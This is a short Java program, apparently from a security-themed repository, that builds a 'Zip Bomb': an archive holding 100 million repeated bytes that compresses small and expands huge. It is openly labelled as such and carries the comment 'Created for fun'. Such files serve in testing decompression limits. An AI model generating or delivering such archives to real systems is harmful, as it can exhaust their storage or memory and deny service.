package io.github.adamw7.security;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipB {

	public static void main(String[] args) throws IOException {
		contruct(100000000L);
	}

	private static void contruct(long len) throws IOException {
		System.out.println("Starting construction of Zip Bomb containing: " + len + " bytes");
		long start = System.currentTimeMillis();
		File file = new File("b.zip");
		file.delete();
		try (ZipOutputStream zout = new ZipOutputStream(new FileOutputStream(file))) {
			ZipEntry entry = new ZipEntry("a");
	        entry.setComment("Created for fun");
	        zout.putNextEntry(entry);
			
			for (int i = 0; i < len; ++i) {
				zout.write(createBatch());
			}
		}

		System.out.println("Zip file size: " +  file.length() + " bytes");
		System.out.println("Took " + (System.currentTimeMillis() - start)/1000 + " secs");
	}

	private static byte[] createBatch() {
		return new byte[] { 'a' };
	}
}
